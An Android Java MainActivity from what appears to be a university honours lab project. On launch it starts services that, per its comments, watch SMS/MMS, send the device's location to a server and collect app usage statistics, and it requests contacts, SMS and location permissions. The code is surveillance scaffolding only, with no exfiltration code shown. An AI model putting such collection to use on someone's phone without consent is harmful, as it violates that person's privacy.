package uk.ac.rgu.lab04.honours;

import android.Manifest;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;



public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        startSMSService();

        //checking permissions and grant them
        checkingPermissions();

        //service sending location to server
        startLocationService();

        //service sending app usage stats
        startUsageStats();
    }

    /***************************
    **                        **
    **  SMS OBSERVER SERVICE  **
    **                        **
    ***************************/
    private void startSMSService() {
        Intent intent = new Intent(this, ListenSmsMmsService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        }
    }

    /***************************
    **                        **
    **  USAGE STATS SERVICE   **
    **                        **
    ***************************/
    private void startUsageStats() {
        Intent intent = new Intent(this,UsageStatService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(intent);
        }
    }


    /***************************
    **                        **
    **    LOCATION SERVICE    **
    **                        **
    ***************************/
    public void startLocationService(){
        Intent intent = new Intent(this,LocationService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        }
    }

    /***************************
    **                        **
    **  GRANTING PERMISSIONS  **
    **                        **
    ***************************/
    public void checkingPermissions(){

        if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, 200);
        }

        if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_SMS}, 200);
        }

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 200);
        }

        AppOpsManager appOps = (AppOpsManager)
                getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), getPackageName());

        if (mode != AppOpsManager.MODE_ALLOWED) {
            startActivityForResult(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), 200);
        }

        /////////////////////////
        //
        // FOR TESTING PURPOSE ONLY
        //
        /////////////////////////

        Button btnContact = findViewById(R.id.button);


        btnContact.setOnClickListener(new View.OnClickListener(){

            public void onClick(View v) {
                Intent intentMain = new Intent(MainActivity.this,
                        Contacts.class);
                MainActivity.this.startActivity(intentMain);
                Log.i("Content "," Contact ");
            }
        });

    }

}
